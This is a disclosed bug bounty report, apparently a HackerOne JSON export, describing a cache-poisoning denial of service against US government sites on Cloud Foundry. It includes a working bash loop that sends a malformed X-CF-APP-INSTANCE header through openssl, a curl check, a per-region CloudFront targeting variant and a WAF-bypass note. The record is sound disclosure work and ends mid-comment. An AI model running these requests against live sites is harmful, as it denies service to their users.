{"id":728664,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mjg2NjQ=","url":"https://hackerone.com/reports/728664","title":"Cache poisoning DoS to various TTS assets","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-11-04T07:36:48.616Z","submitted_at":"2019-11-04T07:36:48.616Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"nathand","url":"/nathand","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21499,"url":"https://hackerone.com/tts","handle":"tts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"TTS Bug Bounty","twitter_handle":"gsa_tts","website":"https://18f.gsa.gov","about":"The First Civilian Agency Public Bug Bounty Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-03-12T16:02:40.277Z","bug_reporter_agreed_on_going_public_at":"2020-03-12T00:37:02.194Z","team_member_agreed_on_going_public_at":"2020-03-12T16:02:40.193Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at https://cpdos.org.\n\nThe technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:\n\n```\nX-CF-APP-INSTANCE\n```\n\nThis header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:\n\n```\nX-CF-APP-INSTANCE: xxx:1\n```\n\n**Please note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly.** They have not yet confirmed the vulnerability, although I'm fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don't cache 404's, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.\n\nThe following assets appear to be vulnerable:\n\n```\nanalytics.usa.gov\nfederation.data.gov\n18f.gsa.gov\ncode.gov\n```\n\nPlease note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against `login.gov` and did not succeed, which I suspect might be because `login.gov` is specifically configured not to cache 404 errors. With that said, the config for `login.gov` may provide a means to protect the above listed assets and others that may be vulnerable.\n\n## Proof of concept\n\nTo poison the cache for a resource, the following script can be used - in this case, `https://federation.data.gov/?cb=xxx` is being poisoned to serve a 404 error to other users. Please note the presence of the `?cb=xxx` query string - this is designed to be a \"cache buster\", to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.\n\n```\n#!/bin/bash\n\nwhile true\ndo\n    printf 'GET /?cb=xxx HTTP/1.1\\r\\n'\\\n'Host: federation.data.gov\\r\\n'\\\n'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\\r\\n'\\\n'Accept: */*\\r\\n'\\\n'Accept-Language: en-US,en;q=0.5\\r\\n'\\\n'Accept-Encoding: gzip, deflate\\r\\n'\\\n'X-CF-APP-INSTANCE: xxx:1\\r\\n'\\\n'Connection: close\\r\\n'\\\n'\\r\\n'\\\n    | openssl s_client -ign_eof -connect federation.data.gov:443\n    sleep 1\ndone\n```\n\n(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)\n\nYou should see 404 errors being returned in this script's output. Because the web cache appears to key on `Cookie` header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):\n\n```\ncurl -i -s -k -X $'GET' \\\n    -H $'Host: federation.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \\\n    $'https://federation.data.gov/?cb=xxx'\n```\n\nIf there are specific resources and assets which don't key cache on cookie headers, then these will probably be easier to exploit against more users. \n\nIn this asset's case, the error will be:\n\n```\n404 Not Found: Requested route ('cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov') does not exist.\n```\n\nA bonus here is this error reveals an \"internal\" hostname otherwise not accessible to an attacker.\n\nGiven the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS' around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like https://www.nexcess.net/web-tools/dns-checker/, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).\n\nOne thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the `cf logs APP_NAME` output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.\n\n## Impact\n\nBy exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.","vulnerability_information_html":"\u003cp\u003eI have recently come across a technique to force a Cloudfoundry app to return a HTTP 404 error when requesting any resource, which contains cache friendly headers. What this means is, if the Cloudfoundry app in question is behind a web cache like Cloudfront or Cloudflare etc, it will possibly store a copy of the 404 error response as the cache for the resource being requested, which is served to other users. This describes a cache poisoning Denial of Service, and the concept for this is detailed at \u003ca title=\"https://cpdos.org\" href=\"/redirect?url=https%3A%2F%2Fcpdos.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cpdos.org\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eThe technique to achieve CPDoS against a Cloudfoundry and hence TTS app is to send a request with the following header:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-CF-APP-INSTANCE\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis header is designed to allow admins to debug CF apps, by choosing which app instance they want serving their request. However, if we supply this header with a bad value, it will force the gorouter in the Cloudfoundry stack to issue a HTTP 404, e.g.:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eX-CF-APP-INSTANCE: xxx:1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003ePlease note: I have already reported this to Pivotal/Cloudfoundry by contacting their security email address directly.\u003c/strong\u003e They have not yet confirmed the vulnerability, although I\u0026#39;m fairly confident the issue exists in gorouter. However, I thought it relevant to report this to you regardless, as you should be able to mitigate this vulnerability without waiting for Pivotal to release an update for gorouter, by configuring your web caches/WAFs appropriately (don\u0026#39;t cache 404\u0026#39;s, strip out this header etc). With that said, I understand if this report is not valid due to this - if this is the case, a heads up so I can close it from my end would be appreciated.\u003c/p\u003e\n\n\u003cp\u003eThe following assets appear to be vulnerable:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eanalytics.usa.gov\nfederation.data.gov\n18f.gsa.gov\ncode.gov\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePlease note that this is not an exhaustive list as I did not test against every asset in scope, however I did attempt the poisoning against \u003ccode\u003elogin.gov\u003c/code\u003e and did not succeed, which I suspect might be because \u003ccode\u003elogin.gov\u003c/code\u003e is specifically configured not to cache 404 errors. With that said, the config for \u003ccode\u003elogin.gov\u003c/code\u003e may provide a means to protect the above listed assets and others that may be vulnerable.\u003c/p\u003e\n\n\u003ch2 id=\"proof-of-concept\"\u003eProof of concept\u003c/h2\u003e\n\n\u003cp\u003eTo poison the cache for a resource, the following script can be used - in this case, \u003ccode\u003ehttps://federation.data.gov/?cb=xxx\u003c/code\u003e is being poisoned to serve a 404 error to other users. Please note the presence of the \u003ccode\u003e?cb=xxx\u003c/code\u003e query string - this is designed to be a \u0026quot;cache buster\u0026quot;, to prevent poisoning the real home page. You may need to change the cache buster value to avoid hitting a previous successful cached copy.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e#!/bin/bash\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewhile \u003c/span\u003e\u003cspan class=\"nb\"\u003etrue\n\u003c/span\u003e\u003cspan class=\"k\"\u003edo\n    \u003c/span\u003e\u003cspan class=\"nb\"\u003eprintf\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;GET /?cb=xxx HTTP/1.1\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;Host: federation.data.gov\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;Accept: */*\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;Accept-Language: en-US,en;q=0.5\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;Accept-Encoding: gzip, deflate\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;X-CF-APP-INSTANCE: xxx:1\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;Connection: close\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n\u003cspan class=\"s1\"\u003e\u0026#39;\\r\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u003c/span\u003e\n    | openssl s_client \u003cspan class=\"nt\"\u003e-ign_eof\u003c/span\u003e \u003cspan class=\"nt\"\u003e-connect\u003c/span\u003e federation.data.gov:443\n    \u003cspan class=\"nb\"\u003esleep \u003c/span\u003e1\n\u003cspan class=\"k\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e(FYI the poisoning script can probably sleep longer than 1 second - this is just to make sure the poisoning takes effect)\u003c/p\u003e\n\n\u003cp\u003eYou should see 404 errors being returned in this script\u0026#39;s output. Because the web cache appears to key on \u003ccode\u003eCookie\u003c/code\u003e header values, this will only poison the cache for users without a pre-existing cookie for the domain (i.e. new users). This can be demonstrated by the following curl command (or by accessing the resource in a private browser window session without pre-existing cookies):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k -X $\u0026#39;GET\u0026#39; \\\n    -H $\u0026#39;Host: federation.data.gov\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Connection: close\u0026#39; \\\n    $\u0026#39;https://federation.data.gov/?cb=xxx\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf there are specific resources and assets which don\u0026#39;t key cache on cookie headers, then these will probably be easier to exploit against more users. \u003c/p\u003e\n\n\u003cp\u003eIn this asset\u0026#39;s case, the error will be:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e404 Not Found: Requested route (\u0026#39;cg-06ab120d-836f-49a2-bc22-9dfb1585c3c6.app.cloud.gov\u0026#39;) does not exist.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA bonus here is this error reveals an \u0026quot;internal\u0026quot; hostname otherwise not accessible to an attacker.\u003c/p\u003e\n\n\u003cp\u003eGiven the assets all appear to use Cloudfront for caching, it is true that the poisoning will be regional - however, it is fairly trivial to acquire VPS\u0026#39; around the world (or perhaps just around the US in this case) to poison specific regions, and using a tool like \u003ca title=\"https://www.nexcess.net/web-tools/dns-checker/\" href=\"/redirect?url=https%3A%2F%2Fwww.nexcess.net%2Fweb-tools%2Fdns-checker%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.nexcess.net/web-tools/dns-checker/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, an attacker may be able to determine regional IPs for the asset, and poison regions by directly targeting them (not confirmed - I was aware of a technique to do this but was unable to confirm this).\u003c/p\u003e\n\n\u003cp\u003eOne thing I did notice is these poisoning attacker requests may not hit the app logs in Cloudfoundry, e.g. the \u003ccode\u003ecf logs APP_NAME\u003c/code\u003e output, since it errors at the gorouter. If you have app logging dependent on displaying what is visible in the CF app logs, it may not detect these attacks.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBy exploiting this vulnerability, an attacker may be able to achieve denial of service for various TTS assets, particularly to new users.\u003c/p\u003e\n","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":20,"voters":["agent-r5","a_d_a_m","takester","naategh","cyberunit","its_afolic","zimmer75","archerl","cryptographer","clarckowen_","and 10 more..."],"severity":{"rating":"high","score":7.5,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":1010,"asset_type":"URL","asset_identifier":"https://federation.data.gov","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6216570,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @nathand,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@sodacan\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nathand\"\u003e@nathand\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T00:06:25.344Z","updated_at":"2019-11-05T00:06:25.344Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6216803,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @nathand,\nSince DoS is out of scope are you able to exploit this vuln in any other real world way to prove impact? Your input is appreciated,\n@sodacan","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nathand\"\u003e@nathand\u003c/a\u003e,\u003cbr\u003e\nSince DoS is out of scope are you able to exploit this vuln in any other real world way to prove impact? Your input is appreciated,\u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T01:08:32.519Z","updated_at":"2019-11-05T01:08:32.519Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6216843,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @sodacan - it was my interpretation that traditional volume DoS was not in scope, as the VD policy specifically calls out \"Network denial of service\":\n\nhttps://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md\n\nThe exploit here does not require a high volume of requests - in fact, just one well timed request would be enough to poison the homepage of the assets I listed for a period of time (and ensuing single requests to keep it poisoned when the cache is aged off, about 30 seconds or so apart from what I can tell).\n\nI understand DoS is normally listed as out of scope, but that appears to be to prevent testers from sending excess traffic - this does not require excess traffic and is possible to test without disrupting real requests at all (using cache busters). Is there a way we could get TTS to weigh in on whether they believe cache poisoning is in scope?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e - it was my interpretation that traditional volume DoS was not in scope, as the VD policy specifically calls out \u0026quot;Network denial of service\u0026quot;:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2F18F%2Fvulnerability-disclosure-policy%2Fblob%2Fmaster%2Fvulnerability-disclosure-policy.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/18F/vulnerability-disclosure-policy/blob/master/vulnerability-disclosure-policy.md\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe exploit here does not require a high volume of requests - in fact, just one well timed request would be enough to poison the homepage of the assets I listed for a period of time (and ensuing single requests to keep it poisoned when the cache is aged off, about 30 seconds or so apart from what I can tell).\u003c/p\u003e\n\n\u003cp\u003eI understand DoS is normally listed as out of scope, but that appears to be to prevent testers from sending excess traffic - this does not require excess traffic and is possible to test without disrupting real requests at all (using cache busters). Is there a way we could get TTS to weigh in on whether they believe cache poisoning is in scope?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T01:19:28.994Z","updated_at":"2019-11-05T01:21:26.996Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6218630,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"One impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).\n\nFor example, if you send `X-CF-APP-INSTANCE: xxx:1` to `cloud.gov`, you will get the 404 with `landing.app.cloud.gov` in the message back. We can now request `landing.app.cloud.gov` directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.","markdown_message":"\u003cp\u003eOne impact other that cache poisoning that abusing this header can provide is what I touched upon above in the error message - it may provide a way to bypass Cloudfront and directly request an app (WAF bypass).\u003c/p\u003e\n\n\u003cp\u003eFor example, if you send \u003ccode\u003eX-CF-APP-INSTANCE: xxx:1\u003c/code\u003e to \u003ccode\u003ecloud.gov\u003c/code\u003e, you will get the 404 with \u003ccode\u003elanding.app.cloud.gov\u003c/code\u003e in the message back. We can now request \u003ccode\u003elanding.app.cloud.gov\u003c/code\u003e directly and, based on the response headers coming back, it appears we have bypassed Cloudfront caching/WAF.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T08:05:15.541Z","updated_at":"2019-11-05T08:05:15.541Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6224230,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nathand,\nThe internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. \n@sodacan","markdown_message":"\u003cp\u003e\u003ca href=\"/nathand\"\u003e@nathand\u003c/a\u003e,\u003cbr\u003e\nThe internal TTS Bug Bounty team is reviewing your report and deciding how they wish to move forward. As soon as a decision is made we will relay the message. \u003cbr\u003e\n\u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T19:53:57.116Z","updated_at":"2019-11-05T19:53:57.116Z","actor":{"username":"sodacan","cleared":false,"url":"/sodacan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/397/342/f09b69d30e08f05bbd6f12bf02200844bdf46f11_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6224881,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @sodacan - much appreciated.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/sodacan\"\u003e@sodacan\u003c/a\u003e - much appreciated.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-05T21:41:24.972Z","updated_at":"2019-11-05T21:41:24.972Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6242483,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"TTS considers this report in scope, and are [tweaking our policy](https://github.com/18F/vulnerability-disclosure-policy/pull/48) as a result. Thanks for bringing to our attention!","markdown_message":"\u003cp\u003eTTS considers this report in scope, and are \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2F18F%2Fvulnerability-disclosure-policy%2Fpull%2F48\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweaking our policy\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as a result. Thanks for bringing to our attention!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-07T15:53:59.712Z","updated_at":"2019-11-07T15:53:59.712Z","actor":{"username":"afeld","cleared":false,"url":"/afeld","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/677/233/c952c552d5b5f53dc8e21fba283567f3c342c354_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6249268,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @afeld, let me know if you need any further info or to test any fixes. I'll update here if I hear back from Pivotal before this is resolved.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/afeld\"\u003e@afeld\u003c/a\u003e, let me know if you need any further info or to test any fixes. I\u0026#39;ll update here if I hear back from Pivotal before this is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-08T00:54:58.001Z","updated_at":"2019-11-08T00:54:58.001Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6311663,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"FYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS' in specific regions. First you figure out the IP address of the POP you want to poison (https://www.nexcess.net/web-tools/dns-checker/ is good for this), and then modify the above poison script so the request looks like:\n\n```\nopenssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov\n```\n\nThe key is the `-servername` because it appears Cloudfront requires SNI to serve a request.\n\nSo it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.","markdown_message":"\u003cp\u003eFYI - still nothing back from CloudFoundry yet, but I did figure out/remember how to poison specific Amazon Cloudfront cache POPs without needing to create VPS\u0026#39; in specific regions. First you figure out the IP address of the POP you want to poison (\u003ca title=\"https://www.nexcess.net/web-tools/dns-checker/\" href=\"/redirect?url=https%3A%2F%2Fwww.nexcess.net%2Fweb-tools%2Fdns-checker%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.nexcess.net/web-tools/dns-checker/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is good for this), and then modify the above poison script so the request looks like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eopenssl s_client -ign_eof -connect IP_HERE:443 -servername federation.data.gov\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe key is the \u003ccode\u003e-servername\u003c/code\u003e because it appears Cloudfront requires SNI to serve a request.\u003c/p\u003e\n\n\u003cp\u003eSo it is fairly trivial to poison any Cloudfront POP from basically anywhere in the world.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-11-15T05:01:11.272Z","updated_at":"2019-11-15T05:01:47.527Z","actor":{"username":"nathand","cleared":false,"url":"/nathand","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NY2oTeWofAnqK1X5MRNFCDXy/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6318148,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-15T16:19:21.141Z","updated_at":"2019-11-15T16:19:21.141Z","additional_data":{"old_severity":"Medium (4.3)","new_severity":"High (7.5)","old_severity_id":555345,"new_severity_id":566848},"actor":{"username":"gsa_adborden","cleared":false,"url":"/gsa_adborden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6406657,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-26T06:38:43.999Z","updated_at":"2019-11-26T06:38:43.999Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6469302,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good measure.","markdown_message":"\u003cp\u003eHi TTS - I believe the cache poisoning vulnerability outlined in this report has been fixed in gorouter release 0.195.0. The gorouter should now return a HTTP 400 when presented with an invalid X-CF-INSTANCE-ID header, and includes no-cache headers for good 